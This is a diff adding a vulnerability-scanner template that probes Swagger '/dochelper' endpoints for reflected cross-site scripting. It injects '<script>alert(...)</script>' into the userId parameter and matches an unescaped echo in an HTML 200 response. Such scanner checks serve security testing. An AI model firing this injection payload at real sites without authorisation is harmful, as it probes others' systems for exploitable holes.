@@ -1,0 +1,26 @@
+id: swagger-xss
+
+info:
+  name: Swagger API XSS
+  author: geeknik
+  severity: low
+  tags: swagger,xss
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/dochelper?userId=<script>alert({{randstr}})</script>"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "text/html"
+      - type: word
+        part: body
+        words:
+          - "<script>alert({{randstr}})</script>"
+      - type: status
+        status:
+          - 200
